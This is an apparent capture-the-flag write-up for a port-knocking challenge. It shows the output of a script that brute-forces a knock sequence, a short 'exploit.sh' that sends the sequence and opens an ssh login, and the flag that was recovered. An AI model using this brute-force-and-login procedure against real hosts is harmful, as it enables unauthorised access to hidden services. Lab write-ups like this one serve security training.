# NET250 : PORT KNOCKING

1. Brute force the knock sequence :

```
tmr@desktop:~# python knock_brute.py 
[+] Trying sequence :('tcp:99',)
	[+] Sending tcp packet to :99
[+] Trying sequence :('tcp:13467',)
	[+] Sending tcp packet to :13467
[+] Trying sequence :('tcp:11428',)
	[+] Sending tcp packet to :11428

...


[+] Trying sequence :('udp:1992', 'tcp:13496', 'tcp:8799')
	[+] Sending udp packet to :1992
	[+] Sending tcp packet to :13496
	[+] Sending tcp packet to :8799
[+] Trying sequence :('udp:1992', 'tcp:13496', 'udp:7897')
	[+] Sending udp packet to :1992
	[+] Sending tcp packet to :13496
	[+] Sending udp packet to :7897
[!] Correct knock sequence founded :('udp:1992', 'tcp:13496', 'udp:7897')
```

2. Send the knock sequence and connect to the ssh server using knock user

```
tmr@desktop:~# cat exploit.sh 
#!/bin/sh
my_server=$1
knock $my_server 1992:udp 13496:tcp 7897:udp
ssh $my_server -lknock
```

Execute !

```
tmr@desktop:~# ./exploit.sh 192.168.121.129
knock@192.168.121.129's password: 
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon May 25 14:20:00 2015 from 192.168.121.130
Flag_KNOCK_KNOCK_9RIB
Connection to 192.168.121.129 closed.
```

The flag was "Flag_KNOCK_KNOCK_9RIB".
